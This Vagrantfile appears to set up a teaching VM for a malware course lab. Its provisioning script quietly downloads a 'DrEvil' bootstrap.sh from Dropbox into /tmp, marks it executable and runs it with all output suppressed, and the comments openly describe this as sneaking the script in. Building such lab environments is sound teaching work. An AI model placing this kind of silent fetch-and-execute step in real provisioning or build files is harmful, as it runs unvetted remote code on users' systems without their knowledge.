# -*- mode: ruby -*-
# vi: set ft=ruby :

# This is the vagrant file to use for Lab 4.

# Sneak DrEvil's script into the VM. This will put the script bootstrap.sh into the /tmp directory,
# makes the script executable, and then executes the bootstrap.sh script. The bootstrap.sh script is
# located in a Dropbox account.
$script = <<SCRIPT
cd /tmp
wget https://www.dropbox.com/s/gxr252hld7a8xa7/bootstrap.sh?dl=0 -Obootstrap.sh > /dev/null 2>&1
chmod u+x bootstrap.sh
/tmp/bootstrap.sh > /dev/null 2>&1
SCRIPT

Vagrant.configure("2") do |config|
  
  # This is the vagrant box we are using for the lab.
  config.vm.box = "ubuntu/trusty64"
  
  config.vm.provider "virtualbox" do |v|  
     v.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
     v.customize ["modifyvm", :id, "--natdnsproxy1", "on"]
  end
  # config.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
 #  config.customize ["modifyvm", :id, "--natdnsproxy1", "on"]
  
  # The folloing line tells vagran to run the inline script defined above to configure
  # the VM once it is up and running. This inline script is dumped into the VM at:
  # /tmp/vagrant-shell
  config.vm.provision :shell, inline: $script

  # This line configures the name of the VM.
  config.vm.define "I230_Malware_VM"
  
  # The following line maps VM apache server port 80 to the host machines port 4566
  config.vm.network :forwarded_port, guest: 80, host: 4566

end
